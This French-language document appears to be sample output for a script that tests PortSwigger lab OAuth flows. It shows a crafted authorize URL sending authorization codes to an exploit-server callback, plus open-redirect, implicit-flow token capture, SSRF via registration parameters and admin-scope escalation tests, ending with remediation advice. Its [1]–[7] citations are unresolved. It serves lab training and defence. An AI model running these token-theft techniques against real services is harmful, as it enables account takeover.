# MANPAGE

Voici un **exemple exhaustif de l’exécution du script OAuth PortSwigger incluant l’exemple d’enregistrement d’application sur l’exploit server**, couvrant chaque étape du script et illustrant le déroulé typique d’un lab PortSwigger OAuth, notamment ceux impliquant le vol de code ou de token via une application externe :

---

### 0. Exemple d’application OAuth à enregistrer sur le serveur d’exploitation

```
------------------------------------------------------
[0] Exemple d'application OAuth à enregistrer sur le serveur d'exploitation (exploit server)
Utilisez ces valeurs lors de l'enregistrement de votre application sur le serveur OAuth cible :

Nom de l'application : ExploitApp
Client ID            : acme
Client Secret        : (généré automatiquement ou à noter)
Redirect URI         : https://exploit-<your-lab>.exploit-server.net/callback
Scopes               : openid profile email (ou admin, selon le lab)
Type d'application   : Web application / Confidential
Grant type           : Authorization Code

Après l'enregistrement, utilisez le lien suivant pour lancer l'authentification :
https://<your-lab>.web-security-academy.net/oauth2/authorize?client_id=acme&response_type=code&redirect_uri=https://exploit-<your-lab>.exploit-server.net/callback&scope=openid

Sur l'exploit server, créez un endpoint /callback pour capturer le code ou le token.
Vous pouvez visualiser les requêtes reçues dans l'interface de l'exploit server PortSwigger.
```
*Le script fournit la configuration à utiliser pour enregistrer une application OAuth sur l’exploit server, comme demandé dans de nombreux labs PortSwigger[6][5].*

---

### 1. Analyse des endpoints OAuth

```
------------------------------------------------------
[1] Analyse des endpoints OAuth
  [+] Endpoint trouvé : https://<your-lab>.web-security-academy.net/oauth2/authorize
HTTP/1.1 200 OK
Content-Type: text/html
...
  [+] Endpoint trouvé : https://<your-lab>.web-security-academy.net/oauth2/token
HTTP/1.1 200 OK
Content-Type: application/json
...
```
*Le script détecte les endpoints d’autorisation/token, ou les fichiers de configuration OpenID (`/.well-known/`).*

---

### 2. Test d’open redirect sur redirect_uri

```
------------------------------------------------------
[2] Test d’open redirect sur redirect_uri
  [+] Open redirect détecté sur redirect_uri !
Location: https://exploit-<your-lab>.exploit-server.net/callback?code=6f8b...
```
*Le script construit une URL d’auth avec un `redirect_uri` externe et vérifie que la redirection est acceptée, ce qui permet de voler un code ou un token dans certains labs[5][6].*

---

### 3. Test de vulnérabilité CSRF/state

```
------------------------------------------------------
[3] Test de vulnérabilité CSRF/state
  [-] Pas de paramètre state (risque CSRF possible).
```
*Le script vérifie si le paramètre `state` est présent dans la réponse de l’endpoint d’autorisation. Son absence indique une protection CSRF insuffisante, vecteur courant d’attaque OAuth[1].*

---

### 4. Test de l’implict flow (token dans l’URL)

```
------------------------------------------------------
[4] Test de l’implict flow (token dans l’URL)
  [+] Implicit flow détecté, access_token exposé dans l’URL !
access_token=eyJ0eXAiOiJKV1QiLCJhbGciOi...
```
*Le script force `response_type=token` et vérifie si un access_token est renvoyé dans l’URL, exposant le token à des attaques via open redirect ou proxy page[4][3][5].*

---

### 5. Test de code leakage (code dans l’URL ou via Referer)

```
------------------------------------------------------
[5] Test de code leakage (code dans l’URL ou via Referer)
  [+] Code OAuth détecté dans l’URL ou la réponse !
code=6f8b2a9c2f7e4a...
```
*Le script vérifie si le code d’autorisation est exposé dans l’URL ou dans les headers, ce qui peut permettre un vol de code OAuth par un attaquant si un open redirect est exploité[6][5].*

---

### 6. Test de la présence de PKCE

```
------------------------------------------------------
[6] Test de la présence de PKCE
  [-] PKCE non supporté ou non exigé.
```
*Le script teste la prise en charge de PKCE (Proof Key for Code Exchange), une protection contre l’interception du code. Son absence est une faiblesse sur les flows publics[1].*

---

### 7. Test SSRF via registration (jwks_uri, jku, request_uri)

```
------------------------------------------------------
[7] Test SSRF via registration (jwks_uri, jku, request_uri)
- Enregistrez une application OAuth sur le serveur cible avec une URL contrôlée (jwks_uri, jku, request_uri) pointant vers https://exploit-<your-lab>.exploit-server.net.
- Surveillez les logs de l’exploit server pour détecter une requête du serveur OAuth.
```
*Le script rappelle la démarche pour tester l’attaque SSRF via des paramètres d’enregistrement dynamique, vue dans les recherches avancées PortSwigger[2].*

---

### 8. Test de manipulation des scopes

```
------------------------------------------------------
[8] Test de manipulation des scopes
  [+] Scope admin accepté dans la réponse !
```
*Le script tente d’obtenir un scope privilégié (`scope=openid admin`). Si accepté, cela permet d’obtenir des droits étendus ou d’accéder à des données sensibles.*

---

### 9. Conseils/remédiation

```
------------------------------------------------------
[Remédiation & Conseils]
- Validez strictement redirect_uri (whitelist, comparaison stricte).
- Exigez et liez un paramètre state unique à la session utilisateur.
- Utilisez PKCE pour protéger le code d’autorisation.
- Ne jamais exposer access_token ou code dans l’URL ou via Referer.
- Filtrez et validez tous les paramètres d’enregistrement (jwks_uri, jku, request_uri).
- Limitez les scopes accessibles et vérifiez leur usage côté serveur.
- Documentation PortSwigger : https://portswigger.net/web-security/oauth
```
*Le script rappelle les bonnes pratiques recommandées par PortSwigger pour sécuriser les implémentations OAuth[7].*

---

### 10. Synthèse

```
------------------------------------------------------
[SYNTHÈSE]
0. Exemple d'enregistrement d'application sur l'exploit server.
1. Découverte des endpoints OAuth.
2. Tests d’open redirect, CSRF/state, implicit flow, code leakage, PKCE, SSRF, scope.
3. Contrôle automatisé ou semi-automatisé de la réponse.
4. Conseils de remédiation PortSwigger.
------------------------------------------------------
```
